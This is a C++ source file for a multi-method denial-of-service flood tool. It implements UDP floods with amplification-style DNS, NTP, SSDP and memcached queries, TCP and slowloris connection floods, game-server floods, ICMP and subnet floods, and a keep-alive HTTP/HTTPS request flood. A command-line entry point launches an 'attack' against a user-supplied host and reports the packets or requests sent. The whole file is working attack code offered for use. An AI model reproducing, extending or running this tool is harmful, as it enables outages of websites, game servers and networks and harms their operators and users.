/*
 * methods.cpp — Lightweight flood engine written in C++ (< 1 MB binary size)
 * Supports:
 *   L4 UDP: dns, udp, ldap, ssdp, ntp, memcached, home, udpbypass
 *   L4 TCP: tcp, socket, slowloris, ovh, tcpmix, tcpbypass, ack
 *   L4 GAME: game, rainbow, rocket, roblox, fivem, pubg, fortnite, warthunder, counter, samp, minecraft
 *   L3: subnet, icmp
 *   L7: http, https, httpx, browser, http2, tls, tlsx, bypass, cache, rapidflood, cloudflare
 *
 * All L7 methods share one fasthttp-style profile: keep-alive connection
 * reuse, TLS 1.3 only (X25519/P-256), GET with curl/8.7.1 UA, and
 * 2xx-4xx responses counted as successful.
 */

#include <arpa/inet.h>
#include <chrono>
#include <cstring>
#include <fcntl.h>
#include <iomanip>
#include <iostream>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <random>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>

static std::atomic<bool> g_running(true);
static std::atomic<uint64_t> g_packets_sent(0);

// Random helpers
static inline uint16_t rand16() {
    static thread_local std::minstd_rand gen((uint32_t)(uintptr_t)&gen ^ (uint32_t)time(nullptr));
    return (uint16_t)gen();
}

static inline uint32_t rand32() {
    static thread_local std::minstd_rand gen((uint32_t)(uintptr_t)&gen ^ (uint32_t)time(nullptr));
    return (uint32_t)gen();
}

static void rand_payload(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] = (char)(rand16() % 256);
    }
}

// IP resolution helper
static bool resolve_target(const std::string &host, struct sockaddr_in &addr, int port) {
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) == 1) {
        return true;
    }

    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return false;
    }

    struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
    addr.sin_addr = ipv4->sin_addr;
    freeaddrinfo(res);
    return true;
}

// Checksum calculator for raw packets
static unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// -------------------------------------------------------------
// L4 UDP FLOOD WORKER
// -------------------------------------------------------------
static void worker_udp(std::string host, int port, std::string method) {
    struct sockaddr_in target;
    if (!resolve_target(host, target, port)) return;

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return;

    char buf[1460];
    int payload_size = 1024;

    if (method == "dns") {
        const char dns_q[] = "\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01";
        memcpy(buf, dns_q, sizeof(dns_q) - 1);
        payload_size = sizeof(dns_q) - 1;
    } else if (method == "ntp") {
        const char ntp_q[] = "\x17\x00\x03\x2a\x00\x00\x00\x00";
        memcpy(buf, ntp_q, 8);
        payload_size = 8;
    } else if (method == "ssdp") {
        const char ssdp_q[] = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n";
        memcpy(buf, ssdp_q, sizeof(ssdp_q) - 1);
        payload_size = sizeof(ssdp_q) - 1;
    } else if (method == "memcached") {
        const char memc_q[] = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
        memcpy(buf, memc_q, sizeof(memc_q) - 1);
        payload_size = sizeof(memc_q) - 1;
    } else if (method == "samp") {
        char samp_q[] = "SAMP\x00\x00\x00\x00\x00\x00\x69";
        memcpy(buf, samp_q, 11);
        payload_size = 11;
    } else if (method == "counter") {
        const char src_q[] = "\xFF\xFF\xFF\xFF\x54Source Engine Query\x00";
        memcpy(buf, src_q, sizeof(src_q) - 1);
        payload_size = sizeof(src_q) - 1;
    } else if (method == "fivem") {
        const char fivem_q[] = "\xFF\xFF\xFF\xFFgetinfo xxx\x00";
        memcpy(buf, fivem_q, sizeof(fivem_q) - 1);
        payload_size = sizeof(fivem_q) - 1;
    }

    while (g_running.load(std::memory_order_relaxed)) {
        if (method == "udp" || method == "udpbypass" || method == "game" ||
            method == "home" || method == "ldap" || method == "rainbow" ||
            method == "rocket" || method == "roblox" || method == "pubg" ||
            method == "fortnite" || method == "warthunder" || method == "minecraft") {
            rand_payload(buf, 1024);
            payload_size = 1024;
        }

        sendto(fd, buf, payload_size, MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
        g_packets_sent.fetch_add(1, std::memory_order_relaxed);
    }
    close(fd);
}

// -------------------------------------------------------------
// L4 TCP / SYN / ACK / SOCKET / SLOWLORIS FLOOD WORKER
// -------------------------------------------------------------
static void worker_tcp(std::string host, int port, std::string method) {
    struct sockaddr_in target;
    if (!resolve_target(host, target, port)) return;

    if (method == "slowloris") {
        std::vector<int> fds;
        while (g_running.load(std::memory_order_relaxed)) {
            if (fds.size() < 100) {
                int s = socket(AF_INET, SOCK_STREAM, 0);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&target, sizeof(target));
                    std::string req = "GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: Mozilla/5.0\r\n";
                    send(s, req.c_str(), req.length(), MSG_NOSIGNAL);
                    fds.push_back(s);
                }
            }

            for (auto it = fds.begin(); it != fds.end();) {
                std::string header = "X-Keep-Alive: " + std::to_string(rand32()) + "\r\n";
                if (send(*it, header.c_str(), header.length(), MSG_NOSIGNAL) <= 0) {
                    close(*it);
                    it = fds.erase(it);
                } else {
                    g_packets_sent.fetch_add(1, std::memory_order_relaxed);
                    ++it;
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        for (int fd : fds) close(fd);
        return;
    }

    char junk[1024];
    rand_payload(junk, sizeof(junk));

    while (g_running.load(std::memory_order_relaxed)) {
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) continue;

        int flag = 1;
        setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
        fcntl(s, F_SETFL, O_NONBLOCK);

        connect(s, (struct sockaddr *)&target, sizeof(target));
        send(s, junk, sizeof(junk), MSG_NOSIGNAL);
        g_packets_sent.fetch_add(1, std::memory_order_relaxed);

        close(s);
    }
}

// -------------------------------------------------------------
// L3 ICMP / SUBNET FLOOD WORKER
// -------------------------------------------------------------
static void worker_icmp(std::string host, int port, std::string method) {
    struct sockaddr_in target;
    if (!resolve_target(host, target, port)) return;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (fd < 0) {
        worker_udp(host, port, "udp");
        return;
    }

    char packet[64];
    memset(packet, 0, sizeof(packet));
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = (uint16_t)rand16();

    while (g_running.load(std::memory_order_relaxed)) {
        icmp->un.echo.sequence = (uint16_t)rand16();
        icmp->checksum = 0;
        icmp->checksum = checksum(packet, sizeof(packet));

        if (method == "subnet") {
            uint32_t cur = ntohl(target.sin_addr.s_addr);
            cur = (cur & 0xFFFFFF00) | (rand16() % 254 + 1);
            target.sin_addr.s_addr = htonl(cur);
        }

        sendto(fd, packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
        g_packets_sent.fetch_add(1, std::memory_order_relaxed);
    }
    close(fd);
}

// -------------------------------------------------------------
// L7 HTTP & HTTPS (TLS) FLOOD WORKER
// Emotionally a fasthttp-style client: TLS 1.3 only, per-worker
// keep-alive connection reuse, back-to-back GETs like client.DoTimeout.
// Status 200-499 = success, >=500 or transport error = failed.
// -------------------------------------------------------------
static std::atomic<uint64_t> g_l7_success(0);
static std::atomic<uint64_t> g_l7_failed(0);

// Read HTTP response headers (until \r\n\r\n) and return the status code.
// Returns -1 on timeout / connection error / malformed response.
static int read_status(int fd, SSL *ssl) {
    char buf[8192];
    std::string acc;
    size_t nl = std::string::npos;

    while (g_running.load(std::memory_order_relaxed)) {
        // Bound the blocking read so shutdown responds fast (poll 250ms)
        struct pollfd pfd;
        pfd.fd = fd;
        pfd.events = POLLIN;
        int pr = poll(&pfd, 1, 250);
        if (pr == 0) continue;            // nothing yet, loop checks g_running
        if (pr < 0 || (pfd.revents & (POLLERR | POLLHUP | POLLNVAL))) {
            return -1;
        }

        int n = ssl ? SSL_read(ssl, buf, sizeof(buf))
                    : (int)recv(fd, buf, sizeof(buf), 0);
        if (n <= 0) return -1;

        size_t old = acc.size();
        acc.append(buf, (size_t)n);

        nl = acc.find("\r\n", old == 0 ? 0 : (old > 2 ? old - 2 : 0));
        if (nl != std::string::npos) break;

        if (acc.find("HTTP/") != 0) return -1;
    }
    if (nl == std::string::npos) return -1;

    // Parse "HTTP/1.1 200 OK" -> 200
    size_t sp = acc.find(' ');
    if (sp == std::string::npos) return -1;
    size_t codeStart = acc.find_first_of("0123456789", sp + 1);
    if (codeStart == std::string::npos) return -1;
    std::string codeStr;
    for (size_t i = codeStart; i < nl && acc[i] >= '0' && acc[i] <= '9'; i++)
        codeStr.push_back(acc[i]);
    if (codeStr.empty()) return -1;
    return std::atoi(codeStr.c_str());
}

// Best-effort drain of any body bytes already buffered after headers,
// so the keep-alive socket stays clean for the next request.
// Non-blocking: only consumes what is immediately readable.
static void drain_pending(int fd, SSL *ssl) {
    char b[4096];
    for (int i = 0; i < 512; i++) {
        struct pollfd pfd;
        pfd.fd = fd;
        pfd.events = POLLIN;
        int pr = poll(&pfd, 1, 0);
        if (pr <= 0) break;
        if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) break;
        int n = ssl ? SSL_read(ssl, b, sizeof(b))
                    : (int)recv(fd, b, sizeof(b), MSG_DONTWAIT);
        if (n <= 0) break;
    }
}

static void worker_l7(std::string rawUrl, std::string method, SSL_CTX *ssl_ctx) {
    (void)method; // all L7 methods now share one fasthttp-style profile

    bool isHttps = true;
    std::string cleanHost = rawUrl;

    if (cleanHost.rfind("https://", 0) == 0) {
        isHttps = true;
        cleanHost = cleanHost.substr(8);
    } else if (cleanHost.rfind("http://", 0) == 0) {
        isHttps = false;
        cleanHost = cleanHost.substr(7);
    }

    int port = isHttps ? 443 : 80;

    size_t colon = cleanHost.find(':');
    size_t slash = cleanHost.find('/');

    std::string path = "/";
    if (slash != std::string::npos) {
        path = cleanHost.substr(slash);
        cleanHost = cleanHost.substr(0, slash);
    }

    if (colon != std::string::npos) {
        size_t colon_end = (slash != std::string::npos && slash > colon) ? slash : cleanHost.length();
        std::string port_str = cleanHost.substr(colon + 1, colon_end - colon - 1);
        int p = std::atoi(port_str.c_str());
        if (p > 0) port = p;
        cleanHost = cleanHost.substr(0, colon);
    }

    struct sockaddr_in target;
    if (!resolve_target(cleanHost, target, port)) return;

    // fasthttp setHeaders(): GET, User-Agent curl/8.7.1, Accept */*
    const std::string req =
        "GET " + path + " HTTP/1.1\r\n"
        "Host: " + cleanHost + "\r\n"
        "User-Agent: curl/8.7.1\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n\r\n";

    const struct timeval tv = { 10, 0 }; // read/write timeout (fasthttp: 10s)

    while (g_running.load(std::memory_order_relaxed)) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);

        int flag = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));

        if (connect(fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
            close(fd);
            g_l7_failed.fetch_add(1, std::memory_order_relaxed);
            continue;
        }

        SSL *ssl = nullptr;
        if (isHttps && ssl_ctx) {
            ssl = SSL_new(ssl_ctx);
            SSL_set_fd(ssl, fd);
            SSL_set_tlsext_host_name(ssl, cleanHost.c_str());
            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                close(fd);
                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
                continue;
            }
        }

        // Keep-alive loop: reuse the connection, fire GETs back-to-back
        // like fasthttp's DoTimeout, counting response status.
        while (g_running.load(std::memory_order_relaxed)) {
            int n = ssl ? SSL_write(ssl, req.c_str(), (int)req.length())
                        : (int)send(fd, req.c_str(), req.length(), MSG_NOSIGNAL);
            if (n <= 0) break;

            g_packets_sent.fetch_add(1, std::memory_order_relaxed);

            int code = read_status(fd, ssl);
            if (code >= 200 && code < 500) {
                g_l7_success.fetch_add(1, std::memory_order_relaxed);
                drain_pending(fd, ssl);
            } else if (code >= 500) {
                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
            } else {
                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
                break; // transport error / closed connection -> reconnect
            }
        }

        if (ssl) SSL_free(ssl);
        close(fd);
    }
}

// -------------------------------------------------------------
// MAIN ENTRYPOINT
// Usage:
//   L4: ./flood <method> <host> <port> <time> [threads]
//   L7: ./flood <method> <url> <time> [threads]
//       ./flood <method> <url> <port> <time> [threads]  (backwards-compatible)
// -------------------------------------------------------------
int main(int argc, char *argv[]) {
    if (argc < 3) {
        std::cout << "Usage:\n"
                  << "  L4: " << argv[0] << " <method> <host/ip> <port> <time_seconds> [threads]\n"
                  << "  L7: " << argv[0] << " <method> <url> <time_seconds> [threads]\n";
        return 1;
    }

    std::string method = argv[1];
    std::string target = argv[2];

    bool isL7 = (method == "http" || method == "https" || method == "httpx" ||
                 method == "browser" || method == "http2" || method == "tls" ||
                 method == "tlsx" || method == "bypass" || method == "cache" ||
                 method == "rapidflood" || method == "cloudflare");

    int port = 0;
    int duration = 0;
    int threads = 4;

    if (isL7) {
        // If 3 arguments provided after target: ./flood <method> <url> <time> [threads]
        // or 4 arguments: ./flood <method> <url> <port> <time> [threads]
        if (argc == 4) {
            duration = std::atoi(argv[3]);
        } else if (argc >= 5) {
            // Check if argv[3] is duration or port
            // If argc == 5: could be (<url> <time> <threads>) OR (<url> <port> <time>)
            if (target.find("http://") == 0 || target.find("https://") == 0 || std::atoi(argv[3]) > 65535) {
                duration = std::atoi(argv[3]);
                threads = std::atoi(argv[4]);
            } else {
                // If 4th arg is passed as port, check next arg as time
                port = std::atoi(argv[3]);
                duration = std::atoi(argv[4]);
                if (argc >= 6) threads = std::atoi(argv[5]);
            }
        }
    } else {
        if (argc < 5) {
            std::cout << "Usage for L4: " << argv[0] << " <method> <host> <port> <time> [threads]\n";
            return 1;
        }
        port = std::atoi(argv[3]);
        duration = std::atoi(argv[4]);
        if (argc >= 6) threads = std::atoi(argv[5]);
    }

    if (duration <= 0) duration = 10;
    if (threads <= 0) threads = 4;
    if (threads > 128) threads = 128;

    std::cout << "[*] Dispatching " << method << " attack against " << target 
              << " for " << duration << "s (" << threads << " threads)\n";

    SSL_CTX *ssl_ctx = nullptr;
    if (isL7) {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (ssl_ctx) {
            SSL_CTX_set_mode(ssl_ctx, SSL_MODE_ENABLE_PARTIAL_WRITE | SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
            SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, nullptr);
            // fasthttp-style TLS: TLS 1.3 only, X25519 / P-256 curves
            SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_3_VERSION);
            SSL_CTX_set_max_proto_version(ssl_ctx, TLS1_3_VERSION);
            SSL_CTX_set1_curves_list(ssl_ctx, "X25519:P-256");
        }
    }

    std::vector<std::thread> pool;

    bool isICMP = (method == "icmp" || method == "subnet");
    bool isTCP = (method == "tcp" || method == "socket" || method == "slowloris" ||
                  method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");

    auto t_start = std::chrono::steady_clock::now();

    for (int i = 0; i < threads; i++) {
        if (isL7) {
            pool.emplace_back(worker_l7, target, method, ssl_ctx);
        } else if (isICMP) {
            pool.emplace_back(worker_icmp, target, port, method);
        } else if (isTCP) {
            pool.emplace_back(worker_tcp, target, port, method);
        } else {
            pool.emplace_back(worker_udp, target, port, method);
        }
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));
    g_running.store(false, std::memory_order_release);

    for (auto &th : pool) {
        if (th.joinable()) th.join();
    }

    double elapsed = std::chrono::duration<double>(std::chrono::steady_clock::now() - t_start).count();
    if (elapsed < 0.001) elapsed = 0.001;

    if (ssl_ctx) {
        SSL_CTX_free(ssl_ctx);
    }

    uint64_t sent = g_packets_sent.load();
    std::cout << "[+] Attack completed.\n";
    if (isL7) {
        std::cout << "    Hit target: " << target << "\n";
        std::cout << "    Time taken: " << std::fixed << elapsed << "s\n";
        std::cout << "    Requests fired: " << sent << "\n";
        std::cout << "    Landed clean (2xx-4xx): " << g_l7_success.load() << "\n";
        std::cout << "    Bounced back: " << g_l7_failed.load() << "\n";
        std::cout << "    Cruising at: " << std::fixed << (double)sent / elapsed << " req/s\n";
    } else {
        std::cout << "    Sent " << sent << " requests/packets.\n";
    }
    return 0;
}
